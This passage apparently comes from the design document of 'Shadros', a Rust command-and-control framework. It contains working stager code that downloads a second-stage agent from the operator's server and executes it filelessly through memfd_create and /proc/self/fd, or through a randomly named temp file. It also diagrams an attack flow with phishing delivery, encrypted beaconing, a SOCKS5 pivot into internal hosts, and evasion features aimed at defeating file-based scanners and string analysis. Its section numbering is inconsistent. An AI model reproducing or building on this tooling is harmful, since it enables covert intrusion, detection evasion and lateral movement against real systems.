  └── write ELF bytes ──►│──► anonymous inode ← exists only in RAM
                         │
execv("/proc/self/fd/7", ["/proc/self/fd/7"])
  └── kernel loads ELF ─►│──► reads from the anonymous inode
       from the fd        │    maps code/data segments
       (pid changes)      │    starts new process image
                         │
                         │    the fd is now owned by the new process
                         │    (O_CLOEXEC was NOT set)
                         │    the ELF inode stays alive as long as
                         │    the new process has the fd open
```

In Rust:

```rust
#[cfg(target_os = "linux")]
fn exec(bytes: Vec<u8>) {
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    unsafe {
        // syscall(SYS_memfd_create, name, flags)
        // name = "." (short, non-descriptive)
        // flags = 0  (no MFD_CLOEXEC — fd must survive execv)
        let fd = libc::syscall(
            libc::SYS_memfd_create,
            b".\0".as_ptr(),
            0u64
        ) as libc::c_int;

        if fd < 0 { return; }

        {
            // Write stage-1 ELF into the fd
            let mut f = std::fs::File::from_raw_fd(fd);
            if f.write_all(&bytes).is_err() { return; }
            // mem::forget so File::drop doesn't close fd before execv
            std::mem::forget(f);
        }

        // Build the path string
        let path = format!("/proc/self/fd/{}\0", fd);
        let argv = [path.as_ptr() as *const libc::c_char,
                    std::ptr::null()];

        // execv replaces this process image with the ELF
        // The current process (stager) ceases to exist
        // The new process (stage-1 agent) inherits fd
        libc::execv(path.as_ptr() as *const libc::c_char,
                    argv.as_ptr());
        // unreachable if execv succeeds
    }
}
```

**What forensics sees:**

```
$ ls -la /proc/<pid>/exe
lrwxrwxrwx 1 root root 0 ... /proc/<pid>/exe -> /memfd:. (deleted)
                                                 ↑ shows as deleted

$ cat /proc/<pid>/maps
... r-xp ... /memfd:. (deleted)
              ↑ mapped from an anonymous inode

$ ls /proc/<pid>/fd/
0  1  2  7
              ↑ fd 7 exists but has no filesystem path

No entry in lsof's filesystem view.
No entry in find / -name "beacon*".
The binary is invisible to any file-based scanner.
```

### 5.4 Windows / macOS Execution

```rust
#[cfg(not(target_os = "linux"))]
fn exec(bytes: Vec<u8>) {
    // Generate a random hex filename to avoid pattern matching
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0xdead_beef_cafe_babe);

    let path = temp_dir().join(format!("{:016x}.exe", seed));
    // example: C:\Users\user\AppData\Local\Temp\3f9a2c8b1e74d05a.exe

    fs::write(&path, &bytes).ok();

    #[cfg(not(windows))]
    {
        // Set execute permission (macOS / Linux fallback)
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&path, Permissions::from_mode(0o700)).ok();
    }

    // Spawn and detach — stager exits immediately after
    Command::new(&path)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .ok();
    // stager process exits; stage-1 is now orphaned (runs independently)
}
```

The stage-1 agent should self-delete its temp file after startup
(or a follow-up task can delete it). The stager itself does not delete it
because it exits before the agent has a chance to establish a session.

---

## 5. Client — Operator GUI

### 6.1 Why egui?

| Framework | Language | Dependencies | Binary size | Startup |
|-----------|----------|-------------|-------------|---------|
| Cobalt Strike GUI | Java Swing | JVM (~200 MB) | N/A | ~3–5 s |
| Havoc GUI | Qt (C++) | Qt runtime | ~30 MB | fast |
| Web-based GUIs | Electron/Chromium | Node + Chromium | ~150 MB | ~2–3 s |
| **Shadros** | egui (Rust) | none | ~5 MB | instant |

`egui` is an immediate-mode GUI: every frame the entire UI is redrawn from scratch
based on current application state. There is no retained widget tree, no DOM,
no event listeners. The frame rate is throttled to `request_repaint_after(2 seconds)`
except when the user is interacting.

### 6.2 Application Layout

```
eframe::App::update() — called every frame
 │
 ├── TopBottomPanel::top("titlebar")        30 px
 │   └── [S] SHADROS C2  |  server URL  |  operator name
 │
 ├── TopBottomPanel::top("tabbar")          34 px
 │   └── Overview | Beacons | Listeners | Files | Credentials | Targets | Payload | Settings
 │       ↑ red underline on active tab
 │
 └── CentralPanel  (remaining height)
     │
     ├── Tab::Agents  ─────────────────────────────────────────
     │   │
     │   ├── TopBottomPanel::top("beacons_agents_top")  [beacons_split% of height]
     │   │   └── AgentsPanel::show()  ← sessions table
     │   │
     │   ├── ── draggable grip (9 px) ──────────────────────
     │   │       drag changes beacons_split fraction (0.15–0.85)
     │   │
     │   └── CentralPanel  [remaining height]
     │       └── TerminalPanel::show()  ← multi-tab console
     │
     ├── Tab::Listeners ────────────────────────────────────────
     ├── Tab::Files
     ├── Tab::Build
     └── Tab::Settings
```

### 6.3 Multi-Tab Console System

```
TerminalPanel
 │
 ├── tabs: Vec<ConsoleTab>     ← one per open beacon
 ├── active: usize             ← index of the focused tab
 │
 └── show(ui):
     ├── render tab bar (top 28 px)
     │   └── for each tab: label button + × close button
     │       click → set active
     │       × → remove tab
     │
     └── tabs[active].show(ui)  ← render the active console

ConsoleTab
 ├── label: String             ← "DESKTOP-GM7B2QP@1228"
 ├── active_agent: Option<Uuid>
 ├── entries: Vec<TerminalEntry>
 ├── input: String             ← current input line
 ├── cmd_history: Vec<String>  ← up/down arrow history
 ├── history_idx: Option<usize>
 ├── tab_prefix: String        ← prefix before Tab was pressed
 ├── tab_idx: usize            ← which candidate we're on
 ├── tab_cycling: bool         ← are we in tab-completion mode?
 └── assembly: AssemblyPanel   ← inline assembly sub-panel state

ConsoleTab::show(ui):
 ├── ── sidebar (optional, left) ──────────────────────────
 │   SidePanel::left("terminal_sidebar")
 │   └── collapsible category tree of quick commands
 │
 ├── ── assembly panel (optional, top) ───────────────────
 │   if assembly.open:
 │     TopBottomPanel::top("asm_panel")
 │     └── .NET assembly path, args, AMSI/ETW toggles
 │
 └── CentralPanel
     ├── TopBottomPanel::bottom("term_input_bar")  38 px
     │   └── [HOSTNAME] - arch | username | pid - arch - beacon> [input____] SHADROS
     │       ↑ TextEdit (no frame, monospace 13px)
     │       ↑ Enter key: consume_key() → dispatch command
     │       ↑ Tab key:   cycle completions
     │       ↑ ↑/↓ keys: history navigation
     │
     └── CentralPanel  (output area)
         └── ScrollArea::vertical (stick_to_bottom, auto_shrink=false)
             └── for each TerminalEntry:
                 ├── [operator] [id_short]  beacon > {cmd}
                 ├── [*] task sent to beacon
                 └── [+] received output: / [-] error: / [*] completed (no output)
```

### 6.4 Tab Completion Implementation

```
Tab key pressed in input box:
 │
 ├── input is empty → do nothing
 │
 ├── tab_cycling == false (first Tab press):
 │   ├── tab_prefix = current input.trim()
 │   ├── candidates = tab_candidates()
 │   │     all built-in command names + extensions BOF names
 │   ├── filter candidates where c.starts_with(tab_prefix)
 │   ├── tab_idx = 0
 │   └── tab_cycling = true
 │
 ├── tab_cycling == true (subsequent Tab presses):
 │   └── tab_idx = (tab_idx + 1) % candidates.len()
 │
 └── self.input = candidates[tab_idx]

Any other key while cycling:
 └── tab_cycling = false  (reset, user typed something new)
```

### 6.5 Build Panel Flow

```
Operator fills in:
  Target:      [Linux x64 / Windows x64 / ...]
  Listener:    [selected from dropdown]
  Sleep:       [30] seconds
  Jitter:      [0.3]
  User-Agent:  [Mozilla/5.0 ...]

Click "Build" (stageless)
  │
  ├── POST /api/build/agent { target, listener_id, sleep, ... }
  ├── server: cargo build --bin svc --target x86_64-unknown-linux-musl
  ├── server: returns { filename, size, data: base64 }
  ├── client: base64-decode → write to ~/Downloads/beacon_linux_x64
  └── UI: shows ✓ build complete card with filename + size + save button

Click "Staged Build"
  │
  ├── POST /api/build/stager { same args }
  ├── server:
  │   ├── build stage-1 (full agent) → store in RAM at stage_uuid
  │   └── build stage-0 (stager) with SHADROS_STAGE_URL baked in
  ├── client: receives { stager_filename, stager_size, stager_data, stage_url }
  ├── client: saves stager binary to ~/Downloads/
  └── UI: shows staged build card (stage-0 details)
```

---

## 6. End-to-End Data Flow

### 7.1 Complete Attack Flow — Staged Deployment

```
┌──────────────────────────────────────────────────────────────────────────┐
│  STEP 1: Operator builds staged payload                                  │
│                                                                          │
│  [Operator GUI]  POST /api/build/stager                                  │
│       │                                                                   │
│       │         [Server: cargo build]                                    │
│       │         stage-1 agent binary (full, ~2 MB) → stored in RAM       │
│       │         stage-0 stager (~8 KB) returned to operator              │
│       │                                                                   │
│  Operator delivers stage-0 to target via phishing / exploit / USB        │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  STEP 2: Stage-0 runs on target                                          │
│                                                                          │
│  [Target: Linux]                                                         │
│                                                                          │
│  stager executes                                                         │
│     │                                                                    │
│     ├── TCP connect to server:443                                        │
│     ├── GET /ms/stage/<uuid>  HTTP/1.1                                   │
│     ├── receive stage-1 ELF (~2 MB)                                      │
│     │                                                                    │
│     ├── memfd_create(".", 0)  → fd=7                                     │
│     ├── write ELF bytes to fd=7                                          │
│     └── execv("/proc/self/fd/7")                                         │
│          └── stage-1 replaces stager process image                       │
│              fd=7 stays open, ELF never hits disk                        │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  STEP 3: Stage-1 (agent) registers                                       │
│                                                                          │
│  [Target: new process, inherited fd=7]                                   │
│                                                                          │
│  agent: generate ephemeral X25519 keypair                                │
│  agent: POST /ms/register { public_key, auth_token, sysinfo }            │
│  server: derive session key, assign UUID, store in DashMap               │
│  agent: receive UUID + server public key                                  │
│  agent: derive session key (ECDH + HKDF)                                 │
│  GUI: receives WsEvent::AgentConnected → new row appears in table        │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  STEP 4: Normal operation                                                 │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────┐        │
│  │                     BEACON LOOP                              │        │
│  │                                                              │        │
│  │  every ~30 s (±jitter):                                      │        │
│  │                                                              │        │
│  │  agent → server: AES-GCM{ timestamp, results[] }            │        │
│  │  server → agent: AES-GCM{ tasks[], kill, new_sleep }        │        │
│  │                                                              │        │
│  │  tasks run concurrently on tokio thread pool                 │        │
│  │  results queued for next beacon                              │        │
│  └──────────────────────────────────────────────────────────────┘        │
│                                                                          │
│  Operator: types "whoami" in console tab                                 │
│    → POST /api/tasks { agent_id, task_type:"shell", args:{cmd:"whoami"}} │
│    → DB: INSERT task (status=Pending)                                    │
│    → next beacon: agent receives task, executes builtin_whoami()         │
│    → result sent back in next beacon payload                             │
│    → DB: task Completed, output="DESKTOP-GM7B2QP\\wb"                   │
│    → WebSocket: GUI receives TaskCompleted event                         │
│    → console tab shows: [+] received output: DESKTOP-GM7B2QP\wb         │
└──────────────────────────────────────────────────────────────────────────┘
```

### 7.2 Encryption Layer Diagram (Wire View)

```
What travels on the network:

  Registration:
  POST /ms/register HTTP/1.1
  Content-Type: application/json

  {
    "public_key": "mzH9vLpK3...base64(32 bytes)...==",  ← looks random
    "auth_token": "s3cr3t",
    "listener_id": "550e8400-e29b-41d4-a716-446655440000",
    "sysinfo": { "hostname": "...", ... }
  }

  ─────────────────────────────────────────────────────────

  Beacon:
  POST /ms/beacon HTTP/1.1
  Content-Type: application/json

  {
    "agent_id": "550e8400-...",
    "encrypted": "K8mN3pQxRj...base64(nonce + ciphertext + GCM tag)...=="
  }
                  ↑
                  12 bytes nonce + encrypted JSON + 16 bytes auth tag
                  completely opaque — looks like random bytes

  ─────────────────────────────────────────────────────────

  What the encrypted blob contains (after decryption):
  {
    "timestamp": 1719187200,
    "results": [
      {
        "task_id": "...",
        "output": "DESKTOP-GM7B2QP\\wb",
        "error": null,
        "completed_at": 1719187195
      }
    ]
  }

  Response (also encrypted):
  {
    "tasks": [
      {
        "task_id": "...",
        "task_type": "shell",
        "args": { "cmd": "whoami" }
      }
    ],
    "kill": false,
    "new_sleep": null,
    "new_jitter": null
  }
```

### 7.3 SOCKS5 Tunnel Flow

```
Operator wants to access 192.168.1.50:8080 through the agent:

1. Operator: POST /api/agents/<id>/socks/start { port: 1080 }
   Server: starts SOCKS5 relay on 127.0.0.1:1080

2. Agent receives "socks_start" task
   Agent: start SOCKS5 server on 127.0.0.1:<local_port>
   Agent: connect to server:tunnel_port
   Agent: send [16-byte agent UUID] handshake

3. Server tunnel_acceptor receives connection
   Server: TunnelMap[agent_id].push(tcp_stream)

4. Operator: curl --socks5 127.0.0.1:1080 http://192.168.1.50:8080/
   ┌─────────────────────────────────────────────────────────┐
   │                                                         │
   │  curl → SOCKS5 relay (server)                           │
   │                      │                                  │
   │                      │ pop TunnelMap[agent_id]          │
   │                      │                                  │
   │                      └──── reverse tunnel stream ────►  │
   │                                                  agent  │
   │                                         dials 192.168.1.50:8080
   │                                         bridges streams  │
   │                                                         │
   │  curl ◄──────────── HTTP response ─────────────────────  │
   └─────────────────────────────────────────────────────────┘
```

## 7. Shadros vs Modern C2 Frameworks

### What Makes Shadros Structurally Different?

#### 1. Memory-Safe Agent

Every other production C2 agent (Cobalt Strike, Havoc, BRC4, Metasploit) is C.
Memory corruption is possible in any of them — and has been exploited in weaponized
forms. Shadros' agent cannot have buffer overflows, use-after-free, or double-free bugs
by construction. The Rust borrow checker rejects them at compile time.

#### 2. Zero-Dependency Stager (~8 KB)

The Shadros stage-0 is ~400 lines of Rust with zero external crates.
It opens a raw TCP socket, hand-crafts an HTTP/1.1 GET request, reads the body,
and executes via `memfd_create` on Linux or a temp file on Windows.
No OpenSSL, no reqwest, no Tokio, no runtime. Under 10 KB stripped.

#### 3. Linux-Native Fileless Execution

No other major open C2 framework implements `memfd_create` + `/proc/self/fd/<fd>` exec
as a first-class stager feature. On Linux the stage-1 ELF never touches disk:

```
$ ls -la /proc/<pid>/exe
lrwxrwxrwx ... /proc/<pid>/exe -> /memfd:. (deleted)

$ cat /proc/<pid>/maps
7f... r-xp ... /memfd:. (deleted)   ← backed by anonymous inode, not filesystem
```

No file-based scanner finds it. No `lsof` entry with a path. No `find` match.

#### 4. Ephemeral Per-Session X25519 Keys

Most C2s embed a static symmetric or asymmetric key in the binary.
Reverse the binary → find the key → decrypt all recorded beacons.

Shadros agents generate a new ephemeral X25519 keypair on every run.
The session key lives only in process memory and is zeroed on drop (`ZeroizeOnDrop`).
Breaking one session's traffic requires dumping that specific agent process live —
the binary contains nothing that decrypts any past or future session.

#### 5. Concurrent Task Execution

Cobalt Strike's beacon is single-threaded.
A long-running download or screenshot blocks the beacon loop — the operator
cannot issue new commands until the current task completes.

Shadros dispatches every task with `tokio::spawn`.
A 100 MB download, a BOF, and a port scan all run in parallel.
The beacon loop checks in on schedule regardless of what tasks are running.

#### 6. Native GUI — No JVM, No Electron

| Framework | GUI tech | Startup | Memory |
|---|---|---|---|
| Cobalt Strike | Java Swing (JVM) | 3–5 s | ~500 MB |
| Havoc | Qt C++ | fast | ~80 MB |
| Web-based GUIs | Electron / Chromium | 2–4 s | ~200 MB |
| **Shadros** | **egui (Rust native)** | **instant** | **~30 MB** |

---

## Summary

Shadros is built on a small set of principled decisions that reinforce each other:

| Decision | Consequence |
|---|---|
| Rust across all crates | No memory corruption bugs, no runtime required |
| X25519 + HKDF + AES-256-GCM | Per-session keys, forward secrecy, authenticated encryption |
| ZeroizeOnDrop on SessionKey | Session keys cannot be recovered from memory dumps |
| Compile-time baked config | No config file on disk to detect or analyze |
| XOR-obfuscated route strings | `strings` finds no /ms/beacon or /ms/register |
| Built-in shell commands | No child process for whoami, ls, cat, cd, etc. |
| tokio::spawn per task | No blocking, concurrent task execution |
| memfd_create on Linux | Stage-1 ELF never touches the filesystem |
| DashMap for session keys and listeners | Lock-free concurrent reads on hot paths |
| build_lock Mutex | Prevents parallel `cargo build` corruption |
| WebSocket broadcast | Real-time updates to GUI without polling |

---